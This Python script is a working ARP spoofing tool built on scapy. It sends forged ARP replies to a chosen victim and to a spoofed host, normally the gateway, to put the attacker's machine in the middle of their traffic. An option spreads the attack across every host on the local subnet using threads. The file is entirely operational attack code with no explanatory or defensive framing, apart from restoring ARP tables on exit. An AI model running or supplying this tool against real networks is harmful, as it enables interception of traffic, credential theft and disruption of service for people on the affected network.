import optparse
import ipaddress
from network import * 
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import threading
import ipaddress as ipad

def restore(DestinationIP, SourceIP):
	DestinationMAC = getmac(DestinationIP)
	SourceMAC = getmac(SourceIP)
	packet = ARP(op=2, pdst=DestinationIP, hwdst=DestinationMAC, psrc=SourceIP, hwsrc=SourceMAC)
	send(packet, count=6, verbose=False)


def ArpSpoof(mac ,victim, spoof):
	packet = ARP(op=2, pdst=victim, hwdst=mac, psrc=spoof)
	send(packet, verbose=False)


def main():
	parser = optparse.OptionParser(
		'Usage of the program: ' + '-t <target IP>' + ' -s <spoof IP>\n')
	parser.add_option('-t', '--target', dest='victim', type='string',
					  help='specify a target IP, the victim IP)')
	parser.add_option('-s', '--spoof', dest='spoof', type='string',
					  help='specify a spoof IP or a pretend IP, usually the gateway of the network)')
	parser.add_option('-c', '--check', action="store_true", default=False,
					  help='check connectivity of the victim , by default is False')
	parser.add_option('-n', '--network', action="store_true", default=False,
					  help='define the target as a network')
	parser.add_option('-v', '--verbose', action="store_false", default=True,
					  help='set verbose to False')
	options , args  = parser.parse_args()
	victim = options.victim
	spoof = options.spoof
	net = options.network
	verbose = options.verbose
	check = options.check
	if victim : victim = victim.strip()


	if (options.victim == None and net == None):
		parser.print_help()
		return 0
	if (options.spoof == None):
		if verbose : print(INFO("default ip spoof : ") , end="" , flush=True)
		spoof = gateway()
		if verbose : print(BLUE(spoof) , flush=True)
	start(victim , spoof , net  , verbose , check)

def start(victim , spoof , net , verbose , check) : 
	if net :
		try : 
			inet , addr , mask , bd = getnetwork()
			netw = ipad.IPv4Network(addr + '/' + mask , strict=False)
			for ip in netw.hosts() : 
				if ip == addr : continue
				x = threading.Thread(target=start , args=(str(ip) , spoof , False , verbose , check))
				x.start()
		except KeyboardInterrupt : 
			if verbose : print("\n" + INFO("Goodbye") , flush=True)
			exit(0)	
	elif net==False  : 
		try:
			ip_spoof = ipaddress.ip_address(spoof)
			ip_victim = ipaddress.ip_address(victim)
			if check : 
				if not  check_connection(victim) : 
					exit(0)
			mac_victim = getmac(victim) 
			mac_spoof = getmac(spoof) 
			if mac_spoof  == False or mac_victim == False : 
				exit(0)
			while True : 
				N = 0
				ArpSpoof( mac_victim , victim, spoof)
				ArpSpoof(mac_spoof ,spoof, victim)
				N += 2
				time.sleep(100)
		except ValueError : 
			if verbose :  print(DANGER("Error in IP format") , flush=True)
			exit(0)
		except KeyboardInterrupt :
			restore(victim  , spoof)
			restore(spoof , victim)
			if verbose : print("\n" + INFO("Goodbye") , flush=True)
			exit(0)
		except Exception as e : 
			print(e , flush=True)
		
if __name__ == "__main__" : 
	main()
